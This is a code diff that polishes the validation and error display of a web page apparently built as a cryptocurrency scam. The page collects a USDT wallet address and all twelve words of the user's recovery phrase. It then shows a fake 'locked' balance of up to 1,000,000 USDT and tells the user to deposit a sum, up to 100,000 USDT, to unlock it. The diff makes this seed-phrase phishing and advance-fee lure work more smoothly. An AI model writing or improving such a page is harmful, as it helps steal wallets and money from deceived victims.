@@ -510,13 +510,23 @@ select:focus {
   const s2btn = document.getElementById('s2btn');
   const s3btn = document.getElementById('s3btn');
 
+  // ✅ Inline error helper
+  function setFieldError(fieldId, message) {
+    const input = document.getElementById(fieldId);
+    const error = document.getElementById(fieldId + 'Error');
+    if (error) error.textContent = message || '';
+    if (input) input.classList.toggle('input-error', !!message);
+  }
+
   // Step 1 → Step 2
   s1btn.addEventListener('click', () => {
     const addr = document.getElementById('addr').value.trim();
     if (!addr) {
-      alert("Please enter your USDT wallet address.");
+      setFieldError('addr', 'Please enter your USDT (TRC20) wallet address.');
+      document.getElementById('addr').focus();
       return;
     }
+    setFieldError('addr', '');
     setTimeout(() => {
       s1.hidden = true;
       s2.hidden = false;
@@ -525,20 +535,23 @@ select:focus {
 
   // Step 2 → Step 3
   s2btn.addEventListener('click', () => {
-    let phrase = '';
+    let valid = true;
     for (let i = 1; i <= 12; i++) {
-      const word = document.getElementById(`word${i}`).value.trim();
-      if (!word) {
-        alert(`Please enter word ${i} of your recovery phrase.`);
-        return;
+      const id = `word${i}`;
+      const val = document.getElementById(id).value.trim();
+      if (!val) {
+        setFieldError(id, `Please enter word ${i}.`);
+        if (valid) document.getElementById(id).focus();
+        valid = false;
+      } else {
+        setFieldError(id, '');
       }
-      phrase += word + ' ';
     }
-    phrase = phrase.trim();
+    if (!valid) return;
 
     const matchCheck = document.getElementById('matchCheck').checked;
     if (!matchCheck) {
-      alert("Please confirm the backup matches the TRC20 wallet address.");
+      showToast("Please confirm your backup matches your TRC20 wallet address.");
       return;
     }
 
@@ -554,75 +567,77 @@ select:focus {
   tierSelect.addEventListener('change', () => {
     if (tierSelect.value) {
       tierSelect.classList.remove('attention');
+      setFieldError('tierSelect', '');
     }
   });
 
   // Step 3 → Final with loader and dashboard population
-s3btn.addEventListener('click', () => {
-  if (!tierSelect.value) {
-    alert("Please select a tier option.");
-    return;
-  }
+  s3btn.addEventListener('click', () => {
+    if (!tierSelect.value) {
+      setFieldError('tierSelect', 'Please select a tier option.');
+      tierSelect.focus();
+      return;
+    }
+    setFieldError('tierSelect', '');
+    loaderBar.hidden = false;
 
-  loaderBar.hidden = false;
+    setTimeout(() => {
+      s3.hidden = true;
+      fin.hidden = false;
+      loaderBar.hidden = true;
 
-  setTimeout(() => {
-    s3.hidden = true;
-    fin.hidden = false;
-    loaderBar.hidden = true;
+      // Get values
+      const walletAddr = document.getElementById('addr').value.trim();
+      const tierValue = tierSelect.value;
 
-    // Get values
-    const walletAddr = document.getElementById('addr').value.trim();
-    const tierValue = tierSelect.value;
+      // Map tier to deposit + locked amounts
+      const tierMap = {
+        "1M":   { deposit: "100,000", locked: "1,000,000" },
+        "250k": { deposit: "50,000",  locked: "250,000" },
+        "100k": { deposit: "20,000",  locked: "100,000" },
+        "50k":  { deposit: "10,000",  locked: "50,000" },
+        "30k":  { deposit: "5,000",   locked: "30,000" },
+        "8.8k": { deposit: "1,500",   locked: "8,800" },
+        "2.9k": { deposit: "400",     locked: "2,900" },
+        "1.2k": { deposit: "250",     locked: "1,200" },
+        "600":  { deposit: "100",     locked: "600" }
+      };
 
-    // Map tier to deposit + locked amounts
-    const tierMap = {
-      "1M":   { deposit: "100,000", locked: "1,000,000" },
-      "250k": { deposit: "50,000",  locked: "250,000" },
-      "100k": { deposit: "20,000",  locked: "100,000" },
-      "50k":  { deposit: "10,000",  locked: "50,000" },
-      "30k":  { deposit: "5,000",   locked: "30,000" },
-      "8.8k": { deposit: "1,500",   locked: "8,800" },
-      "2.9k": { deposit: "400",     locked: "2,900" },
-      "1.2k": { deposit: "250",     locked: "1,200" },
-      "600":  { deposit: "100",     locked: "600" }
-    };
+      const tierChoice = tierMap[tierValue];
 
-    const tierChoice = tierMap[tierValue];
+      // Populate dashboard
+      document.getElementById('walletDisplay').textContent = walletAddr;
+      document.getElementById('lockedBalance').textContent = `${tierChoice.locked} USDT 🔒 Locked`;
 
-    // Populate dashboard
-document.getElementById('walletDisplay').textContent = walletAddr;
-document.getElementById('lockedBalance').textContent = `${tierChoice.locked} USDT 🔒 Locked`;
-
-// New deposit message with glow
-const depositMsg = document.getElementById('depositMsg');
-depositMsg.textContent =
-  `⏳ Deposit ${tierChoice.deposit} USDT (TRC20) to your wallet to unlock your locked ${tierChoice.locked} USDT`;
-depositMsg.classList.add('glow');
-}, 4000);
-});
+      // New deposit message with glow
+      const depositMsg = document.getElementById('depositMsg');
+      depositMsg.textContent =
+        `⏳ Deposit ${tierChoice.deposit} USDT (TRC20) to your wallet to unlock your locked ${tierChoice.locked} USDT`;
+      depositMsg.classList.add('glow');
+    }, 4000);
+  });
 
   // Copy to clipboard functionality (toast version)
-const copyBtn = document.getElementById('copyBtn');
+  const copyBtn = document.getElementById('copyBtn');
 
-function showToast(message) {
-  const toast = document.getElementById('toast');
-  toast.textContent = message;
-  toast.style.opacity = "1";
+  function showToast(message) {
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.style.opacity = "1";
 
-  setTimeout(() => {
-    toast.style.opacity = "0";
-  }, 2000); // fades out after 2 seconds
-}
+    setTimeout(() => {
+      toast.style.opacity = "0";
+    }, 2000); // fades out after 2 seconds
+  }
 
-copyBtn.addEventListener('click', () => {
-  const walletAddr = document.getElementById('walletDisplay').textContent;
-  navigator.clipboard.writeText(walletAddr).then(() => {
-    showToast("Copied");
-  }).catch(() => {
-    showToast("Failed to copy");
+  copyBtn.addEventListener('click', () => {
+    const walletAddr = document.getElementById('walletDisplay').textContent;
+    navigator.clipboard.writeText(walletAddr).then(() => {
+      showToast("Copied");
+    }).catch(() => {
+      showToast("Failed to copy");
+    });
   });
-});
 </script>
 </body>
 </html>
